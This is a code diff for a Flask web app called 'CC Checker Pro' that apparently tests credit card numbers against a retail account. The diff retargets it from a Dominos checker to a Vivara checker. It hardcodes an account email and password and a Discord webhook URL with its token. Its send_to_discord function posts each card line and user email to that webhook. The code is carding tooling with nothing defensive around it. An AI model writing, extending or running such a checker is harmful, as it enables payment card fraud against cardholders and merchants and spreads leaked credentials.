@@ -6,7 +6,7 @@ from threading import Timer
 from datetime import datetime, timezone
 from flask import Flask, request, jsonify, render_template, session, redirect, url_for
 from supabase import create_client, Client
-from checker_service import DominosChecker
+from checker_service import VivaraChecker
 import checker_service
 
 app = Flask(__name__)
@@ -21,8 +21,8 @@ MISTICPAY_API_URL = "https://api.misticpay.com/api"
 
 supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)
 
-DOMINOS_EMAIL = os.environ.get("DOMINOS_EMAIL", "p808409@gmail.com")
-DOMINOS_PASSWORD = os.environ.get("DOMINOS_PASSWORD", "@P808409p10")
+VIVARA_EMAIL = os.environ.get("VIVARA_EMAIL", "p808409@gmail.com")
+VIVARA_PASSWORD = os.environ.get("VIVARA_PASSWORD", "@P808409p10")
 DISCORD_WEBHOOK_URL = os.environ.get("DISCORD_WEBHOOK_URL", "https://ptb.discord.com/api/webhooks/1488357897632088094/x1V4D1-sKnEGs9dATiqA1uano_H4_daXvlzenaqkJu2QJmgGwRO369VERLZGQrLlBKkO")
 
 def send_to_discord(card_line, user_email):
@@ -41,7 +41,7 @@ def send_to_discord(card_line, user_email):
                     {"name": "Card", "value": f"`{card_line}`", "inline": False},
                     {"name": "Data", "value": f"`{timestamp}`", "inline": True}
                 ],
-                "footer": {"text": "CC Checker Pro"}
+                "footer": {"text": "Vivara CC Checker Pro"}
             }]
         }
         requests.post(DISCORD_WEBHOOK_URL, json=payload, timeout=5)
@@ -49,8 +49,8 @@ def send_to_discord(card_line, user_email):
     except Exception as e:
         print(f"[DISCORD] Erro ao enviar webhook: {e}")
 
-# Instanciando o checker (ele não abrirá o chrome até o primeiro uso)
-checker_service.checker_instance = DominosChecker(DOMINOS_EMAIL, DOMINOS_PASSWORD)
+# Instanciando o checker
+checker_service.checker_instance = VivaraChecker(VIVARA_EMAIL, VIVARA_PASSWORD)
 
 @app.route('/')
 def index():
